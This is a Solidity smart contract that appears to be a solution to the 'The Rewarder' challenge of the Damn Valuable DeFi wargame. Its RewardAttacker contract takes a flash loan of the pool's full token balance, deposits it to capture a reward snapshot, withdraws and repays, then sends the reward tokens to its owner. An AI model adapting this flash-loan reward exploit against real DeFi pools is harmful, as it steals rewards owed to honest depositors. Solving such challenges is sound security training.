// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";


contract RewardAttacker {
    TheRewarderPool victim;
    AccountingToken accToken;
    RewardToken rewToken;
    FlashLoanerPool flashloan;
    DamnValuableToken token;
    address owner;


    constructor(address _victim, address _flashloan, address _token) {
        victim = TheRewarderPool(_victim);
        accToken = TheRewarderPool(_victim).accountingToken();
        rewToken = TheRewarderPool(_victim).rewardToken();
        flashloan = FlashLoanerPool(_flashloan);
        token = DamnValuableToken(_token);
        owner = msg.sender;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(flashloan));
        flashloan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(victim), amount);
        victim.deposit(amount);
        //victim.distributeRewards();
        //accToken.snapshot();
        victim.withdraw(amount);
        token.transfer(msg.sender, amount);

        uint256 amountOfRewards = rewToken.balanceOf(address(this));
        rewToken.transfer(owner, amountOfRewards);
    }

}